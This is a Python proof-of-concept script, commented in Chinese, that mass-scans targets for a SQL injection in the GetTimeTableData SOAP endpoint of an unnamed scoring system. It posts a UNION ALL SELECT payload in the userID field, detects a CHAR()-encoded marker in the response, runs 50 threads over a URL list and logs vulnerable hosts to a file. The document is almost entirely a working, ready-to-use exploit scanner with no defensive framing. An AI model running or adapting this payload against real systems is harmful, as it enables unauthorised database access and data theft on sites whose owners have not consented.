# 某分制系统GetTimeTableData SQL注入
import argparse,sys,requests
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
import time

#定义横幅


def banner():
    banner = """
 ██████╗ ███████╗████████╗████████╗██╗███╗   ███╗███████╗
██╔════╝ ██╔════╝╚══██╔══╝╚══██╔══╝██║████╗ ████║██╔════╝
██║  ███╗█████╗     ██║      ██║   ██║██╔████╔██║█████╗  
██║   ██║██╔══╝     ██║      ██║   ██║██║╚██╔╝██║██╔══╝  
╚██████╔╝███████╗   ██║      ██║   ██║██║ ╚═╝ ██║███████╗
 ╚═════╝ ╚══════╝   ╚═╝      ╚═╝   ╚═╝╚═╝     ╚═╝╚══════╝
                                                         


"""
    print(banner)


#定义主函数
def main():
    #调用横幅
    banner()
    #argparse模块处理命令行参数
    parser = argparse.ArgumentParser(description="某分制系统GetTimeTableData SQL注入")
    parser.add_argument('-u','--url',dest='url',type=str,help='input url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input file path')
    args = parser.parse_args()
    #如果用户输入url而不是file时：
    if args.url and not args.file:
        poc(args.url)
        # if poc(args.url):
        #     exp(args.url)
    #如果用户输入file而不是url时：
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,mode='r',encoding='utf-8') as fr:
            for i in fr.readlines():
                url_list.append(i.strip().replace('\n',''))
                # print(url_list)    
                #设置多线程 
        mp = Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    #如果用户输入的既不是url也不是file时：
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
             
#定义poc
def poc(target):
    payload = '/WebService/Interactive.asmx'
    url = target+payload
    cookies = {"ASP.NET_SessionId": "bwk5l0xu02utzfib4tmsap5t"}
    headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive", "Upgrade-Insecure-Requests": "1", "Priority": "u=1", "SOAPAction": "http://tempuri.org/GetTimeTableData", "Content-Type": "text/xml;charset=UTF-8"}
    data = "\r\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\r\n   <soapenv:Header/>\r\n   <soapenv:Body>\r\n      <tem:GetTimeTableData>\r\n         <!--type: string-->\r\n         <tem:userID>gero et' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(113)+CHAR(118)+CHAR(107)+CHAR(113)+CHAR(74)+CHAR(88)+CHAR(79)+CHAR(115)+CHAR(68)+CHAR(99)+CHAR(75)+CHAR(97)+CHAR(78)+CHAR(86)+CHAR(85)+CHAR(82)+CHAR(87)+CHAR(68)+CHAR(97)+CHAR(71)+CHAR(70)+CHAR(71)+CHAR(80)+CHAR(81)+CHAR(115)+CHAR(88)+CHAR(102)+CHAR(83)+CHAR(114)+CHAR(98)+CHAR(88)+CHAR(116)+CHAR(68)+CHAR(79)+CHAR(90)+CHAR(120)+CHAR(75)+CHAR(74)+CHAR(83)+CHAR(106)+CHAR(85)+CHAR(87)+CHAR(66)+CHAR(113)+CHAR(113)+CHAR(106)+CHAR(113)+CHAR(98)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Hene</tem:userID>\r\n         <!--type: string-->\r\n         <tem:startDate>sonoras imperio</tem:startDate>\r\n      </tem:GetTimeTableData>\r\n   </soapenv:Body>\r\n</soapenv:Envelope>\r\n"
    #请求网页
    try:
        re = requests.get(url=target,verify=False)
        if re.status_code == 200 : 
            res1 = requests.post(url=url,headers=headers,data=data,cookies=cookies,verify=False)
            if res1.status_code == 500 and 'qqvkqJXOsDcKaNVURWDaGFGPQsXfSrbXtDOZxKJSjUWBqqjqbq' in res1.text:   
                print(f'[+++]该{target}存在漏洞')
                with open('result.txt',mode='a',encoding='utf-8')as ft:
                    ft.write(target+'\n')
                return True
            else:
                print(f'该{target}不存在该漏洞')
            return False
    except:
        print(f'该{target}存在问题，请手动测试')
        return False


if __name__ == '__main__':
    main()